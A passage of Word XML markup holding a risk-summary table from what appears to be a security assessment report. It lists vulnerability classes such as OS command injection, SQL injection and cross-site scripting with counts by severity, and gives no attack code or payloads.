          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253" w:rsidP="003B1A2B">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="11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3764"/>
        <w:gridCol w:w="1425"/>
        <w:gridCol w:w="1455"/>
        <w:gridCol w:w="1785"/>
        <w:gridCol w:w="1545"/>
        <w:gridCol w:w="1546"/>
      </w:tblGrid>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7756" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00FB1D3F">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="red"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="red"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFE599" w:themeFill="accent4" w:themeFillTint="66"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="9CC2E5" w:themeFill="accent1" w:themeFillTint="99"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00953B86">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>OS Command Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00953B86">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Code Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00953B86">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>SQL Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00953B86">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="5" w:name="_GoBack"/>
            <w:bookmarkEnd w:id="5"/>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Scripting</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002A6DE1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00953B86">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009A0937">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Backup/Default and Test Files found with Sensitive Information</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002A6DE1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="005D7D56">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Insecure Direct Object Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002A6DE1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidTr="00287724">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3764" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00953B86">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FF5991">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Directory Listing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1425" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1455" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1785" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002A6DE1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1545" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1546" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
